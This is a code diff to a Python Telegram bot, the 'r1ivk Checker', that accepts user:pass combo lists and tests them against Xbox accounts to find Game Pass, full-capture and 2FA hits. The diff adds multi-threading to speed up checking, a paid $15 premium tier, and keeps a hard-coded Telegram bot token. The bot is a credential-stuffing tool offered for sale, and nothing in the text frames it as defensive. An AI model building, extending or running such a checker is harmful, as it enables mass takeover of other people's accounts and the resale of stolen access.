@@ -5,12 +5,12 @@ import re
 import json
 from urllib.parse import unquote, quote
 import threading
-import queue
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import time
 from datetime import datetime
 import io
 
-# Telegram Bot Token (Updated)
+# Telegram Bot Token
 TELEGRAM_TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
 bot = telebot.TeleBot(TELEGRAM_TOKEN)
 
@@ -34,7 +34,7 @@ def solider(source_text, left_str, right_str, var_name, variables, create_empty=
         return False
 
 def soliderRetries(session, method, url, step_name, retries_counter_list, **kwargs):
-    soliderMaxPer = 100
+    soliderMaxPer = 3
     soliderTimeOut = 15
     for attempt in range(soliderMaxPer + 1):
         try:
@@ -48,7 +48,7 @@ def soliderRetries(session, method, url, step_name, retries_counter_list, **kwar
             if attempt < soliderMaxPer:
                 if retries_counter_list:
                     retries_counter_list[0] += 1
-                time.sleep(1 + attempt)
+                time.sleep(1)
                 continue
             else:
                 raise
@@ -181,27 +181,30 @@ def soliderChkAccount(user_pass_line, proxy_dict_for_session, check_mode):
         else:
             return "NO_HITS", None, account_retry_attempts[0]
 
-# --- Telegram Bot Interface (r1ivk Checker UI) ---
+# --- Telegram Bot Interface ---
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
-        types.InlineKeyboardButton("🚀 START", callback_data="start_scan"),
-        types.InlineKeyboardButton("❌ CLOSE", callback_data="close_bot"),
-        types.InlineKeyboardButton("🔑 SERVICES", callback_data="services"),
-        types.InlineKeyboardButton("🔥 CRACKER", callback_data="cracker"),
-        types.InlineKeyboardButton("🎁 REFER", callback_data="refer"),
-        types.InlineKeyboardButton("🏆 LEADERBOARD", callback_data="leaderboard"),
-        types.InlineKeyboardButton("💎 BUY", callback_data="buy"),
-        types.InlineKeyboardButton("👤 PROFILE", callback_data="profile")
+        types.InlineKeyboardButton("⚡ Start Checker", callback_data="start_scan"),
+        types.InlineKeyboardButton("💎 Buy Premium (15$)", callback_data="buy"),
+        types.InlineKeyboardButton("👤 My Account", callback_data="profile")
     )
     welcome_text = (
-        "💎 **r1ivk Checker Bot** 💎\n\n"
-        "Welcome back! Choose an option from the menu below:"
+        "⚡ **r1ivk Checker** ⚡\n\n"
+        "Welcome to the ultimate account checking bot.\n"
+        "Your Status: 👤 Free (0/10000 lines today)\n\n"
+        "Features:\n"
+        "• Xbox Game Pass Status\n"
+        "• Xbox Live Premium\n"
+        "• Gamertag & Profile\n"
+        "• Game entitlements\n"
+        "• Email Access & 2FA detection\n\n"
+        "Click the button below to start checking your combo files!"
     )
     bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup)
 
-@bot.callback_query_handler(func=lambda call: call.data in ["start_scan", "services", "cracker", "refer", "leaderboard", "buy", "profile", "close_bot", "main_menu"])
+@bot.callback_query_handler(func=lambda call: call.data in ["start_scan", "buy", "profile", "close_bot", "main_menu"])
 def handle_menu(call):
     bot.answer_callback_query(call.id)
     chat_id = call.message.chat.id
@@ -225,19 +228,26 @@ def handle_menu(call):
         except Exception:
             pass
     elif call.data == "main_menu":
-        markup = types.InlineKeyboardMarkup(row_width=2)
+        markup = types.InlineKeyboardMarkup(row_width=1)
         markup.add(
-            types.InlineKeyboardButton("🚀 START", callback_data="start_scan"),
-            types.InlineKeyboardButton("❌ CLOSE", callback_data="close_bot"),
-            types.InlineKeyboardButton("🔑 SERVICES", callback_data="services"),
-            types.InlineKeyboardButton("🔥 CRACKER", callback_data="cracker"),
-            types.InlineKeyboardButton("🎁 REFER", callback_data="refer"),
-            types.InlineKeyboardButton("🏆 LEADERBOARD", callback_data="leaderboard"),
-            types.InlineKeyboardButton("💎 BUY", callback_data="buy"),
-            types.InlineKeyboardButton("👤 PROFILE", callback_data="profile")
+            types.InlineKeyboardButton("⚡ Start Checker", callback_data="start_scan"),
+            types.InlineKeyboardButton("💎 Buy Premium (15$)", callback_data="buy"),
+            types.InlineKeyboardButton("👤 My Account", callback_data="profile")
+        )
+        welcome_text = (
+            "⚡ **r1ivk Checker** ⚡\n\n"
+            "Welcome to the ultimate account checking bot.\n"
+            "Your Status: 👤 Free (0/10000 lines today)\n\n"
+            "Features:\n"
+            "• Xbox Game Pass Status\n"
+            "• Xbox Live Premium\n"
+            "• Gamertag & Profile\n"
+            "• Game entitlements\n"
+            "• Email Access & 2FA detection\n\n"
+            "Click the button below to start checking your combo files!"
         )
         try:
-            bot.edit_message_text("💎 **r1ivk Checker Bot** 💎\n\nWelcome back! Choose an option from the menu below:", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+            bot.edit_message_text(welcome_text, chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)
         except Exception:
             pass
     else:
@@ -254,7 +264,7 @@ def set_mode(call):
     
     try:
         bot.edit_message_text(
-            "📥 **Please send your combo file (.txt) or text list:**",
+            "📥 **Please send your combo file (.txt) or text list (Forwarded messages are supported):**",
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
             parse_mode="Markdown",
@@ -263,7 +273,6 @@ def set_mode(call):
     except Exception:
         pass
 
-# معالجة الملفات المرفقة (سواء مرسلة مباشرة أو محولة من قناة)
 @bot.message_handler(content_types=['document'])
 def handle_docs(message):
     user_id = message.from_user.id
@@ -278,12 +287,14 @@ def handle_docs(message):
     except Exception as e:
         bot.send_message(message.chat.id, f"❌ Error reading file: {str(e)}")
 
-# معالجة النصوص المرسلة مباشرة
 @bot.message_handler(func=lambda message: message.from_user.id in user_sessions and user_sessions[message.from_user.id]["step"] == "waiting_combos")
 def handle_text_combos(message):
     if message.document:
         return
-    process_combos_text(message, message.text)
+    
+    text_to_process = message.text or message.caption
+    if text_to_process:
+        process_combos_text(message, text_to_process)
 
 def process_combos_text(message, raw_text):
     user_id = message.from_user.id
@@ -294,7 +305,7 @@ def process_combos_text(message, raw_text):
             combos.append(line)
             
     if not combos:
-        bot.send_message(message.chat.id, "❌ No valid combos found in file/text. Please send a valid list (`user:pass` format):")
+        bot.send_message(message.chat.id, "❌ No valid combos found. Please send a valid list (`user:pass` format):")
         return
         
     mode = user_sessions[user_id]["mode"]
@@ -323,8 +334,7 @@ def generate_progress_text(checked, total, gamepass, full_captures, two_fa, bad,
     bar = "█" * filled_blocks + "░" * (10 - filled_blocks)
     
     text = (
-        f"🤖 **r1ivk | AIOH Checker**\n"
-        f"bot\n\n"
+        f"🤖 **r1ivk | AIO Checker**\n\n"
         f"Progress: {progress_percent:.1f}%\n"
         f"`[{bar}]`\n\n"
         f"⚡ CPM: {cpm}\n"
@@ -352,52 +362,67 @@ def run_live_checker(chat_id, message_id, combos, check_mode, user_id):
     start_time = time.time()
     last_update_time = start_time
     
-    for index, combo in enumerate(combos):
+    # سرعة فائقة عبر خيوط متعددة (Threads) - تم ضبطها على 15 خيط في نفس الوقت
+    max_threads = 15
+    
+    def check_single(combo):
         if user_sessions.get(user_id, {}).get("stop", False):
-            break
-            
-        status, hit_data, _ = soliderChkAccount(combo, None, check_mode)
-        checked += 1
+            return None
+        return soliderChkAccount(combo, None, check_mode)
+
+    with ThreadPoolExecutor(max_workers=max_threads) as executor:
+        futures = {executor.submit(check_single, combo): combo for combo in combos}
         
-        if status == "GAME_PASS_HIT":
-            gamepass += 1
-            hits_list.append(hit_data)
-        elif status == "FULL_CAPTURE_HIT":
-            full_captures += 1
-            hits_list.append(hit_data)
-        elif status == "BAD_CREDENTIALS":
-            bad += 1
-        elif status == "2FA_REQUIRED":
-            two_fa += 1
-            
-        current_time = time.time()
-        if current_time - last_update_time >= 1.5 or checked == total:
-            last_update_time = current_time
-            elapsed = int(current_time - start_time)
-            elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
-            
-            cpm = int((checked / (elapsed / 60))) if elapsed > 0 else 0
-            remaining_items = total - checked
-            eta_secs = int((remaining_items / (cpm / 60))) if cpm > 0 else 0
-            eta_str = time.strftime("%M:%S", time.gmtime(eta_secs))
-            progress_percent = (checked / total) * 100
-            
-            progress_text = generate_progress_text(
-                checked, total, gamepass, full_captures, two_fa, bad, 
-                cpm, elapsed_str, eta_str, progress_percent, "Scanning..."
-            )
-            
+        for future in as_completed(futures):
+            if user_sessions.get(user_id, {}).get("stop", False):
+                break
+                
             try:
-                bot.edit_message_text(progress_text, chat_id=chat_id, message_id=message_id, parse_mode="Markdown")
+                status, hit_data, _ = future.result()
             except Exception:
-                pass
+                status, hit_data = "ERROR", None
+                
+            checked += 1
+            
+            if status == "GAME_PASS_HIT":
+                gamepass += 1
+                if hit_data: hits_list.append(hit_data)
+            elif status == "FULL_CAPTURE_HIT":
+                full_captures += 1
+                if hit_data: hits_list.append(hit_data)
+            elif status == "BAD_CREDENTIALS":
+                bad += 1
+            elif status == "2FA_REQUIRED":
+                two_fa += 1
+                
+            current_time = time.time()
+            if current_time - last_update_time >= 1.5 or checked == total:
+                last_update_time = current_time
+                elapsed = int(current_time - start_time)
+                elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
+                
+                cpm = int((checked / (elapsed / 60))) if elapsed > 0 else 0
+                remaining_items = total - checked
+                eta_secs = int((remaining_items / (cpm / 60))) if cpm > 0 else 0
+                eta_str = time.strftime("%M:%S", time.gmtime(eta_secs))
+                progress_percent = (checked / total) * 100
+                
+                progress_text = generate_progress_text(
+                    checked, total, gamepass, full_captures, two_fa, bad, 
+                    cpm, elapsed_str, eta_str, progress_percent, "Scanning..."
+                )
+                
+                try:
+                    bot.edit_message_text(progress_text, chat_id=chat_id, message_id=message_id, parse_mode="Markdown")
+                except Exception:
+                    pass
 
     final_elapsed = int(time.time() - start_time)
     final_elapsed_str = time.strftime("%H:%M:%S", time.gmtime(final_elapsed))
     final_cpm = int((total / (final_elapsed / 60))) if final_elapsed > 0 else 0
     
     completion_text = (
-        f"✅ **XBOX FULL CAPTURE COMPLETED!**\n\n"
+        f"✅ **XBOX SCAN COMPLETED!**\n\n"
         f"🌐 Total: {total} / {final_cpm} CPM\n"
         f"💎 Full Captures: {full_captures}\n"
         f"🎮 Game Pass: {gamepass}\n"
@@ -420,5 +445,5 @@ def run_live_checker(chat_id, message_id, combos, check_mode, user_id):
             pass
 
 if __name__ == "__main__":
-    print("r1ivk Checker Bot is running (English UI)...")
+    print("r1ivk Checker Bot is running with Multi-threading...")
     bot.infinity_polling()
